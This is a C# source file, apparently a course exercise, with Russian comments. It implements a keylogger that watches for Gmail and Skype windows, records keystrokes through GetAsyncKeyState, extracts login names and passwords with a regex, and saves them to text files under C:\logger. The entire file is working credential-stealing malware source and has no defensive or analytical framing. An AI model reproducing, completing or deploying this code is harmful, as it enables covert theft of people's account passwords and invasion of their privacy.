﻿using System;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.IO;
using System.Threading.Tasks;

namespace CourseTest1
{
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int i);

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern int GetWindowText(IntPtr hWnd, [Out, MarshalAs(UnmanagedType.LPTStr)] StringBuilder lpString, int nMaxCount);

        static void Main(string[] args)
        {
            Task.WaitAll(
                Task.Run(() =>
                {
                    Finder gfinder = new Finder(new GmailFind());
                    gfinder.Find(new Logger(new GmailLogger()).Log());
                    new Writer(new FileWriter()).Write("Gmail:" + Environment.NewLine + gfinder.finder.login
                        + Environment.NewLine + gfinder.finder.password, @"C:\logger\gmaillogs.txt");
                }),
                Task.Run(() =>
                {
                    Finder sfinder = new Finder(new SkypeFind());
                    sfinder.Find(new Logger(new SkypeLogger()).Log());
                    new Writer(new FileWriter()).Write("Skype:" + Environment.NewLine + sfinder.finder.login
                        + Environment.NewLine + sfinder.finder.password, @"C:\logger\skypelogs.txt");
                })
            );
        }
        //////////////////////////////////////////////////////////////
        interface ILogger//интерфейс логгирования
        {
            string appname { get; set; }
            string Log();
        }

        class GmailLogger : ILogger//логгирует нажатия со страницы gmail
        {
            public string appname { get; set; }
            public IUpgrade upgrader;
            public GmailLogger()
            {
                appname = "Gmail";
                upgrader = new KeyUpgrader();
            }
            public string Log()
            {
                int size = 100000;
                StringBuilder logs = new StringBuilder(size), buff = new StringBuilder(size);
                while (true)
                {
                    if (GetWindowText(GetForegroundWindow(), buff, size) > 0)
                    {
                        string s = buff.ToString();
                        if (s.Contains(appname))
                        {
                            if (s.Contains("Входящие"))
                            {
                                logs.Append(s);                     
                                return logs.ToString();
                            }
                            for (int i = 0; i < 255; i++)
                            {
                                int state = GetAsyncKeyState(i);
                                if (state == 1 || state == -32767)
                                {
                                    logs.Append(upgrader.Upgrade(((Keys)i).ToString()));
                                }
                            }
                        }
                    }
                }
            }
        }

        class SkypeLogger : ILogger//логгирует нажатия с приложения skype
        {
            public string appname { get; set; }
            public IUpgrade upgrader;
            public SkypeLogger()
            {
                appname = "Skype";
                upgrader = new KeyUpgrader();
            }
            public string Log()
            {
                int size = 100000;
                StringBuilder logs = new StringBuilder(size), buff = new StringBuilder(size);
                while (true)
                {
                    if (GetWindowText(GetForegroundWindow(), buff, size) > 0)
                    {
                        string s = buff.ToString();
                        if (s.Contains(appname) && s.Contains(" - "))
                        {
                            logs.Append(s);
                            return logs.ToString();
                        }
                        if (s == appname)
                        {
                            for (int i = 0; i < 255; i++)
                            {
                                int state = GetAsyncKeyState(i);
                                if (state == 1 || state == -32767)
                                {
                                    logs.Append(upgrader.Upgrade(((Keys)i).ToString()));
                                }
                            }
                        }
                    }
                }
            }
        }

        class Logger//логгирует символы нажатий клавиатуры
        {
            public ILogger logger;
            public Logger(ILogger logger)
            {
                this.logger = logger;
            }
            public string Log()
            {
                return logger.Log();
            }
        }
        //////////////////////////////////////////////////////////////
        interface IFind//интерфейс поиска в логах почты и пороля
        {
            string login { get; set; }
            string password { get; set; }
            void Find(string logs);
        }

        class GmailFind : IFind//поиск в логах почты и пороля gmail
        {
            public string login { get; set; }
            public string password { get; set; }
            public void Find(string logs)
            {
                int start = logs.IndexOf("Входящие") + 11, end = logs.IndexOf("@gmail.com - Gmail");
                login = logs.Substring(start, end - start);

                string pattern = "mark[A-Za-z0-9]{8,200}mark";
                Regex repas = new Regex(pattern, RegexOptions.Compiled);
                foreach (Match match in repas.Matches(logs))
                {
                    StringBuilder temp = new StringBuilder(match.Value);
                    temp.Replace("mark", "");
                    if (temp.Length > 7)
                        password = temp.ToString();
                }
            }
        }

        class SkypeFind : IFind//поиск в логах почты и пороля skype
        {
            public string login { get; set; }
            public string password { get; set; }
            public void Find(string logs)
            {
                int start = logs.IndexOf(" - ") + 3, end = logs.Length;
                login = logs.Substring(start, end - start);

                string pattern = "mark[A-Za-z0-9]{8,200}mark";
                Regex repas = new Regex(pattern, RegexOptions.Compiled);
                foreach (Match match in repas.Matches(logs))
                {
                    StringBuilder temp = new StringBuilder(match.Value);
                    temp.Replace("mark", "");
                    if (temp.Length > 7)
                        password = temp.ToString();
                }
            }
        }

        class Finder
        {
            public IFind finder;
            public Finder(IFind finder)
            {
                this.finder = finder;
            }
            public void Find(string logs)
            {
                finder.Find(logs);
            }
        }
        //////////////////////////////////////////////////////////////
        interface IUpgrade//интерфейс форматирования символов клавиатуры
        {
            string Upgrade(string sym);
        }

        class KeyUpgrader : IUpgrade//форматирование символов клавиатуры
        {
            private bool Shift;
            public string Upgrade(string sym)
            {
                string temp = "";
                if (sym == "OemPeriod")
                    temp = ".";
                else if (sym == "Oemplus")
                    temp = "+";
                else if (sym == "OemMinus")
                    temp = "-";
                else if (sym == "LButton" || sym == "Enter")
                    temp = "mark";
                else if ((sym.Contains("D") || sym.Contains("NumPad")) && sym.Length > 1)
                {
                    if (sym == "D2" && Shift)
                        temp = "@";
                    else if (!Shift)
                        temp = sym[sym.Length - 1].ToString();
                }
                else if (sym.Length == 1 && char.IsLetter(sym[0]))
                    if (!Shift)
                        temp = sym.ToLower();
                    else
                        temp = sym;
                if (sym == "LShiftKey" || sym == "RShiftKey")
                    Shift = true;
                else
                    Shift = false;
                return temp;
            }
        }
        ///////////////////////////////////////////////
        interface IWriter
        {
            void Write(string path, string s);
        }

        class FileWriter : IWriter
        {
            public void Write(string path, string s)
            {
                if (!Directory.Exists(@"C:\logger"))
                    Directory.CreateDirectory(@"C:\logger");
                File.WriteAllText(path, s);
            }
        }

        class Writer
        {
            public IWriter writter;
            public Writer(IWriter writter)
            {
                this.writter = writter;
            }
            public void Write(string s, string path)
            {
                writter.Write(path, s);
            }
        }
    }
}